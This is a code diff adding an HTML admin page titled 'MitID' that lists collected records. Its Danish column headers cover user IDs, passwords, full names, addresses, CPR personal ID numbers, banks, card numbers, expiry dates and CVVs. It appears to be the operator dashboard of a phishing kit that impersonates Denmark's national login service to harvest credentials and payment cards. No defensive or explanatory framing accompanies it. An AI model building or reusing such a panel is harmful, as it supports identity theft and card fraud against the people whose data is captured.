@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/static/style.css" />
+    <title>MitID</title>
+  </head>
+  <body>
+    <section class="orders light-section">
+      <div class="container mx-auto pt-12">
+        <h1 class="font-bold text-lg mb-4 pl-4">All orders</h1>
+        <div class="table-responsive">
+          <table role="table">
+            <thead role="rowgroup">
+              <tr role="row">
+                <th role="columnheader" class="text-left">BRUGER-ID</th>
+                <th role="columnheader" class="text-left">Adgangskode</th>
+                <th role="columnheader" class="text-left">BRUGER-ID</th>
+                <th role="columnheader" class="text-left">Fulde Navn</th>
+                <th role="columnheader" class="text-left">Adresse</th>
+                <th role="columnheader" class="text-left">By</th>
+                <th role="columnheader" class="text-left">Postnummer</th>
+                <th role="columnheader" class="text-left">Telefon</th>
+                <th role="columnheader" class="text-left">CPR nummer</th>
+                <th role="columnheader" class="text-left">Banker</th>
+                <th role="columnheader" class="text-left">Kortnummer</th>
+                <th role="columnheader" class="text-left">Udløbsdato</th>
+                <th role="columnheader" class="text-left">CVV</th>
+                <th role="columnheader" class="text-left">Date</th>
+              </tr>
+            </thead>
+            <tbody role="rowgroup" id="orderTableBody"></tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.4/moment.min.js"></script>
+    <script src="/static/admin.js"></script>
+  </body>
+</html>
